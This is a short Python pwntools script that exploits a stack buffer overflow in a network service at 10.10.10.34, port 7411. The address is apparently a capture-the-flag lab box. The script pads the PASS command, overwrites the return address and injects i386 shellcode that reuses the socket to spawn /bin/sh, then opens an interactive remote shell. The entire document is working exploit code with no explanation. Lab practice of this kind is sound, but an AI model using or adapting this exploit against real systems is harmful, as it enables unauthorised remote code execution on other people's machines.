#!/usr/bin/python3

from pwn import *



def bof():

    context(os="linux", arch="i386")
    p = remote("10.10.10.34", 7411)

    buf = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
    buf += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
    buf += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
    buf += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    buf += b"\x89\xe3\x31\xc9\xcd\x80"
    
    offset = 28
    before_eip = b"A"*offset
    EIP = p32(0xffffd610+32)
    
    p.recvuntil(b"OK Ready. Send USER command.")
    p.sendline(b"USER admin")
    p.recvuntil(b"OK Send PASS command.")
    p.sendline(b"PASS "+ before_eip + EIP + buf)

    p.interactive()


def main():
    bof()


if __name__ == "__main__":
    main()
